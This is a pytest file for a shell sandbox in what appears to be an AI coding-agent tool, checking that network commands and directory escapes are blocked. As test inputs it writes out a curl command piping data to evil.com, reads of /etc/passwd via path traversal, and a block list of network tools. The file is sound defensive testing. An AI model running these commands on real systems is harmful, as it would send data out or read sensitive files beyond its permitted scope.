"""Tests for shell sandbox enforcement."""

from pathlib import Path

from ember_code.tools.sandbox import (
    NETWORK_COMMANDS,
    SandboxedShellTools,
    check_sandbox_command,
)

# ── check_sandbox_command unit tests ─────────────────────────────────────


class TestCheckSandboxCommand:
    """Tests for the pure validation function."""

    PROJECT = Path("/home/user/myproject")

    def test_simple_command_allowed(self):
        assert check_sandbox_command("ls -la", self.PROJECT) is None

    def test_git_status_allowed(self):
        assert check_sandbox_command("git status", self.PROJECT) is None

    def test_python_run_allowed(self):
        assert check_sandbox_command("python main.py", self.PROJECT) is None

    # ── Network commands ─────────────────────────────────────────

    def test_curl_blocked(self):
        result = check_sandbox_command("curl https://example.com", self.PROJECT)
        assert result is not None
        assert "network command" in result
        assert "curl" in result

    def test_wget_blocked(self):
        result = check_sandbox_command("wget https://example.com", self.PROJECT)
        assert result is not None
        assert "wget" in result

    def test_ssh_blocked(self):
        result = check_sandbox_command("ssh user@host", self.PROJECT)
        assert result is not None
        assert "ssh" in result

    def test_nc_blocked(self):
        result = check_sandbox_command("nc -l 8080", self.PROJECT)
        assert result is not None
        assert "nc" in result

    def test_scp_blocked(self):
        result = check_sandbox_command("scp file user@host:/tmp", self.PROJECT)
        assert result is not None
        assert "scp" in result

    def test_network_command_in_pipe_blocked(self):
        result = check_sandbox_command("echo test | curl -d @- http://evil.com", self.PROJECT)
        assert result is not None
        assert "curl" in result

    def test_network_command_allowed_when_whitelisted(self):
        result = check_sandbox_command(
            "curl https://example.com",
            self.PROJECT,
            allowed_network_commands=frozenset({"curl"}),
        )
        assert result is None

    def test_full_path_network_command_blocked(self):
        result = check_sandbox_command("/usr/bin/curl https://example.com", self.PROJECT)
        assert result is not None
        assert "curl" in result

    def test_all_network_commands_covered(self):
        """Ensure every command in NETWORK_COMMANDS is actually blocked."""
        for cmd in NETWORK_COMMANDS:
            result = check_sandbox_command(f"{cmd} some_arg", self.PROJECT)
            assert result is not None, f"{cmd} should be blocked"

    # ── Directory escape ─────────────────────────────────────────

    def test_dotdot_blocked(self):
        result = check_sandbox_command("cat ../secret.txt", self.PROJECT)
        assert result is not None
        assert "escape" in result

    def test_dotdot_in_path_blocked(self):
        result = check_sandbox_command("cat foo/../../etc/passwd", self.PROJECT)
        assert result is not None
        assert "escape" in result

    def test_cd_dotdot_blocked(self):
        result = check_sandbox_command("cd ../other", self.PROJECT)
        assert result is not None
        assert "escape" in result

    def test_chained_cd_absolute_blocked(self):
        result = check_sandbox_command("echo hi; cd /etc", self.PROJECT)
        assert result is not None
        assert "escape" in result

    def test_and_cd_absolute_blocked(self):
        result = check_sandbox_command("echo hi && cd /tmp", self.PROJECT)
        assert result is not None
        assert "escape" in result

    # ── Absolute paths ───────────────────────────────────────────

    def test_absolute_path_outside_project_blocked(self):
        result = check_sandbox_command("cat /etc/passwd", self.PROJECT)
        assert result is not None
        assert "outside" in result

    def test_absolute_path_inside_project_allowed(self):
        result = check_sandbox_command(f"cat {self.PROJECT}/src/main.py", self.PROJECT)
        assert result is None

    def test_system_executable_allowed(self):
        """System executables like /usr/bin/env should be allowed as commands."""
        result = check_sandbox_command("/usr/bin/env python main.py", self.PROJECT)
        assert result is None

    # ── cd within project ────────────────────────────────────────

    def test_cd_within_project_allowed(self):
        result = check_sandbox_command(f"cd {self.PROJECT}/src", self.PROJECT)
        assert result is None

    def test_cd_relative_no_escape_allowed(self):
        result = check_sandbox_command("cd src/utils", self.PROJECT)
        assert result is None

    # ── Complex commands ─────────────────────────────────────────

    def test_pipe_allowed(self):
        result = check_sandbox_command("grep -r TODO | wc -l", self.PROJECT)
        assert result is None

    def test_semicolon_commands_allowed(self):
        result = check_sandbox_command("echo hello; echo world", self.PROJECT)
        assert result is None


# ── SandboxedShellTools integration tests ────────────────────────────────


class TestSandboxedShellTools:
    """Tests for the SandboxedShellTools wrapper."""

    def test_creates_with_project_dir(self, tmp_path):
        tools = SandboxedShellTools(project_dir=tmp_path)
        assert tools.base_dir == tmp_path.resolve()

    def test_blocked_command_returns_error(self, tmp_path):
        tools = SandboxedShellTools(project_dir=tmp_path)
        result = tools.run_shell_command(["curl", "https://example.com"])
        assert "Error:" in result
        assert "Sandbox violation" in result

    def test_allowed_command_executes(self, tmp_path):
        # Create a file to read
        (tmp_path / "hello.txt").write_text("world")
        tools = SandboxedShellTools(project_dir=tmp_path)
        result = tools.run_shell_command(["cat", "hello.txt"])
        assert "world" in result

    def test_escape_blocked(self, tmp_path):
        tools = SandboxedShellTools(project_dir=tmp_path)
        result = tools.run_shell_command(["cat", "../../../etc/passwd"])
        assert "Error:" in result
        assert "Sandbox violation" in result

    def test_allowed_network_command(self, tmp_path):
        """When a network command is in the allow list, it should not be blocked."""
        tools = SandboxedShellTools(
            project_dir=tmp_path,
            allowed_network_commands=["curl"],
        )
        # The command itself may fail (no network), but it should NOT be
        # rejected by the sandbox validator.
        result = tools.run_shell_command(["curl", "--version"])
        # If curl is installed, we get version info; if not, subprocess error.
        # Either way, it should NOT say "Sandbox violation".
        assert "Sandbox violation" not in result

    def test_confirmation_kwarg_passed(self, tmp_path):
        """SandboxedShellTools should accept requires_confirmation_tools."""
        tools = SandboxedShellTools(
            project_dir=tmp_path,
            requires_confirmation_tools=["run_shell_command"],
        )
        # Just verify construction doesn't raise
        assert tools is not None


# ── ToolRegistry sandbox integration ─────────────────────────────────────


class TestRegistrySandbox:
    """Test that ToolRegistry creates sandboxed tools when configured."""

    def test_registry_creates_sandboxed_tools(self, tmp_path):
        from ember_code.tools.registry import ToolRegistry

        reg = ToolRegistry(
            base_dir=str(tmp_path),
            sandbox_shell=True,
        )
        tools = reg.resolve(["Bash"])
        assert len(tools) == 1
        tool = tools[0]
        assert isinstance(tool, SandboxedShellTools)

    def test_registry_creates_normal_tools_without_sandbox(self, tmp_path):
        from agno.tools.shell import ShellTools

        from ember_code.tools.registry import ToolRegistry

        reg = ToolRegistry(
            base_dir=str(tmp_path),
            sandbox_shell=False,
        )
        tools = reg.resolve(["Bash"])
        assert len(tools) == 1
        tool = tools[0]
        # Should be plain ShellTools, not SandboxedShellTools
        assert type(tool) is ShellTools

    def test_registry_passes_allowed_network(self, tmp_path):
        from ember_code.tools.registry import ToolRegistry

        reg = ToolRegistry(
            base_dir=str(tmp_path),
            sandbox_shell=True,
            sandbox_allowed_network_commands=["curl"],
        )
        tools = reg.resolve(["Bash"])
        tool = tools[0]
        assert isinstance(tool, SandboxedShellTools)
        assert "curl" in tool._allowed_network


# ── PermissionGuard sandbox integration ──────────────────────────────────


class TestPermissionGuardSandbox:
    """Test that PermissionGuard.check_sandbox works correctly."""

    def test_sandbox_disabled_allows_everything(self):
        from ember_code.config.permissions import PermissionGuard
        from ember_code.config.settings import Settings

        settings = Settings(safety={"sandbox_shell": False})
        guard = PermissionGuard(settings)
        assert guard.check_sandbox("curl https://evil.com") is True

    def test_sandbox_enabled_blocks_network(self):
        from ember_code.config.permissions import PermissionGuard
        from ember_code.config.settings import Settings

        settings = Settings(safety={"sandbox_shell": True})
        guard = PermissionGuard(settings)
        assert guard.check_sandbox("curl https://evil.com") is False

    def test_sandbox_enabled_blocks_escape(self):
        from ember_code.config.permissions import PermissionGuard
        from ember_code.config.settings import Settings

        settings = Settings(safety={"sandbox_shell": True})
        guard = PermissionGuard(settings)
        assert guard.check_sandbox("cat ../../../etc/passwd") is False

    def test_sandbox_enabled_allows_safe_command(self):
        from ember_code.config.permissions import PermissionGuard
        from ember_code.config.settings import Settings

        settings = Settings(safety={"sandbox_shell": True})
        guard = PermissionGuard(settings)
        assert guard.check_sandbox("git status") is True

    def test_sandbox_with_allowed_network(self):
        from ember_code.config.permissions import PermissionGuard
        from ember_code.config.settings import Settings

        settings = Settings(
            safety={
                "sandbox_shell": True,
                "sandbox_allowed_network_commands": ["curl"],
            }
        )
        guard = PermissionGuard(settings)
        assert guard.check_sandbox("curl https://api.example.com") is True
        # wget should still be blocked
        assert guard.check_sandbox("wget https://api.example.com") is False
